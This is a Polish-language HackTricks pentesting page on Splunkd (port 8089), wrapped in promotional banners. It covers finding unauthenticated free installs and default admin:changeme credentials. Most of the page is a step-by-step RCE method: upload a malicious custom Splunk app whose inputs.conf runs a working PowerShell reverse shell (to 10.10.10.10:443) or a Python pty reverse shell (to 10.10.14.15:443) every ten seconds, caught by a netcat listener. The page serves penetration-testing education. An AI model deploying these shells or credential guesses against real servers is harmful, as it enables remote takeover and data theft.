# 8089 - Testowanie penetracyjne Splunkd

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Podstawowe informacje**

Splunk to narzdzie do **analizy log贸w**, kt贸re odgrywa kluczow rol w **gromadzeniu, analizowaniu i wizualizacji danych**. Chocia偶 jego pierwotnym celem nie byo penienie roli narzdzia **SIEM (Security Information and Event Management)**, zyskao popularno w dziedzinie **monitorowania bezpieczestwa** i **analizy biznesowej**.

Instalacje Splunk s czsto wykorzystywane do przechowywania **wra偶liwych danych** i mog stanowi **cenne 藕r贸do informacji** dla potencjalnych atakujcych, jeli uda im si zhakowa system.
**Domylny port:** 8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
Serwer internetowy Splunk domylnie dziaa na porcie 8000.
{% endhint %}

## Wyliczanie

### Wersja darmowa

Po 60 dniach wersja pr贸bna Splunk Enterprise przeksztaca si w **wersj darmow**, kt贸ra **nie wymaga uwierzytelniania**. Nie jest rzadkoci, 偶e administratorzy system贸w instaluj wersj pr贸bn Splunka, aby j przetestowa, a nastpnie o niej zapominaj. Automatycznie przeksztaci si ona w wersj darmow, kt贸ra nie posiada 偶adnej formy uwierzytelniania, wprowadzajc luk w zabezpieczeniach rodowiska. Niekt贸re organizacje mog wybra wersj darmow ze wzgldu na ograniczenia bud偶etowe, nie do koca rozumiejc implikacje braku zarzdzania u偶ytkownikami/rolami.

### Domylne dane uwierzytelniajce

W starszych wersjach Splunka domylne dane uwierzytelniajce to **`admin:changeme`**, kt贸re wygodnie s wywietlane na stronie logowania.\
Jednak **najnowsza wersja Splunka** ustawia **dane uwierzytelniajce** **podczas procesu instalacji**. Jeli domylne dane uwierzytelniajce nie dziaaj, warto sprawdzi popularne sabe hasa, takie jak `admin`, `Welcome`, `Welcome1`, `Password123`, itp.

### Uzyskiwanie informacji

Po zalogowaniu si do Splunka mo偶emy **przeglda dane**, uruchamia **raporty**, tworzy **dashbordy**, **instalowa aplikacje** z biblioteki Splunkbase oraz instalowa niestandardowe aplikacje.\
Mo偶na r贸wnie偶 uruchamia kod: Splunk ma wiele sposob贸w **uruchamiania kodu**, takich jak aplikacje Django po stronie serwera, punkty kocowe REST, wprowadzanie skryptowe i skrypty alarmowe. Powszechn metod zdalnego wykonania kodu na serwerze Splunka jest u偶ycie wprowadzenia skryptowego.

Ponadto, poniewa偶 Splunk mo偶e by instalowany na hostach Windows lub Linux, mo偶na tworzy wprowadzenia skryptowe do uruchamiania skrypt贸w Bash, PowerShell lub Batch.

### Shodan

* `Splunk build`

## RCE

### Tworzenie niestandardowej aplikacji

Niestandardowa aplikacja mo偶e uruchamia skrypty **Python, Batch, Bash lub PowerShell**.\
Nale偶y zauwa偶y, 偶e **Splunk jest dostarczany z zainstalowanym Pythonem**, wic nawet na systemach **Windows** bdzie mo偶na uruchamia kod pythona.

Mo偶na u偶y [**tego**](https://github.com/0xjpuff/reverse\_shell\_splunk) pakietu Splunka, aby nam pom贸c. Katalog **`bin`** w tym repozytorium zawiera przykady dla [Pythona](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py) i [PowerShella](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1). Przejd藕my przez to krok po kroku.

Aby to osign, najpierw musimy utworzy niestandardow aplikacj Splunka, korzystajc z nastpujcej struktury katalog贸w:
```shell-session
tree splunk_shell/

splunk_shell/
 bin
 default
```
Katalog **`bin`** bdzie zawiera wszystkie **skrypty, kt贸re zamierzamy uruchomi** (w tym przypadku odwr贸con powok **PowerShell**), a domylny katalog bdzie zawiera nasz plik `inputs.conf`. Nasza odwr贸cona powoka bdzie jednolinijkowym skryptem **PowerShell:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
Plik [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) informuje Splunk **kt贸ry skrypt uruchomi** oraz zawiera inne warunki. Tutaj ustawiamy aplikacj jako wczon i m贸wimy Splunkowi, aby uruchamia skrypt co 10 sekund. Interwa zawsze jest podany w sekundach, a wejcie (skrypt) zostanie uruchomione tylko wtedy, gdy ten parametr jest obecny.
```shell-session
cat inputs.conf

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
Potrzebujemy pliku `.bat`, kt贸ry zostanie uruchomiony podczas wdra偶ania aplikacji i wykona jednolinijkowy skrypt PowerShell.

Nastpnym krokiem jest wybranie opcji `Zainstaluj aplikacj z pliku` i przesanie aplikacji.

<figure><img src="../.gitbook/assets/image (4) (5) (1).png" alt=""><figcaption></figcaption></figure>

Przed przesaniem zoliwej niestandardowej aplikacji, uruchommy nasuchiwanie za pomoc Netcat lub [socat](https://linux.die.net/man/1/socat).
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
Na stronie `Przelij aplikacj` kliknij przegldaj, wybierz wczeniej utworzony plik tarball i kliknij `Przelij`. Jak **tylko przesana zostanie aplikacja**, otrzymamy **odwr贸con powok** i status aplikacji automatycznie zostanie zmieniony na `Wczony`.

#### Linux

Jeli mielibymy do czynienia z **hostem Linux**, musielibymy **edytowa skrypt Pythona `rev.py`** przed utworzeniem pliku tarball i przesaniem niestandardowej zoliwej aplikacji. Reszta procesu byaby taka sama, a my uzyskalibymy poczenie z odwr贸con powok na naszym nasuchujcym Netcat i moglibymy zacz dziaa.
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### RCE & Eskalacja uprawnie

Na nastpnej stronie znajdziesz wyjanienie, jak mo偶na wykorzysta t usug do eskalacji uprawnie i uzyskania trwaoci:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## Odwoania

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
